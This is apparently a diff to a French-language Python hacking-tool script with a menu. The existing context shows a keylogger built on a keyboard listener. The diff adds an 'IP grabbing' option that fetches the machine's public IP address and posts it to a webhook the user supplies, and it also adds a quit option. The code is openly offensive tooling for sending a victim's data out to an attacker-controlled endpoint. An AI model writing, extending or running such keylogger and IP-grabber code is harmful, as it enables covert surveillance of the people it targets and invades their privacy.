@@ -633,7 +633,9 @@ while True:
             ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝ 
             
             1. [KeyLogger]
-            
+            2. [Grabing IP]
+            3. [Quit]
+
                 {white}
             Fais ton choix : """)
         
@@ -678,10 +680,39 @@ while True:
             listener = keyboard.Listener(on_press=on_press)
             listener.start()
             listener.join()
+        
+        elif covid == "2":
+            os.system("cls")
+            ip_grabing = input("""
+                 ██████╗ ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗     ██╗██████╗ 
+                ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     ██║██╔══██╗
+                ██║  ███╗██████╔╝███████║██████╔╝██║██╔██╗ ██║██║  ███╗    ██║██████╔╝
+                ██║   ██║██╔══██╗██╔══██║██╔══██╗██║██║╚██╗██║██║   ██║    ██║██╔═══╝ 
+                ╚██████╔╝██║  ██║██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝    ██║██║     
+                ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝╚═╝     
+                    
+                Met Ton webhook : """)
 
+            webhook = ip_grabing
+
+            try:
+                ip = requests.get("https://checkip.amazonaws.com").text.strip()
+             #  print(ip)
+                data = {
+                    "content": ip
+                }
+                requests.post(webhook, json=data)
+            except ValueError:
+                print("Value error")
+                time.sleep(3)
+
+    elif covid == "3":
+        print("Au-Revoir a bientot l'amis")
+        time.sleep(2)
+        break
 
     # Ici on a mis le quit si la personne a lancé sans fair expres
-    elif choix == "":
+    elif choix == "5":
         print("Au-Revoir a bientot l'amis")
         time.sleep(2)
         break
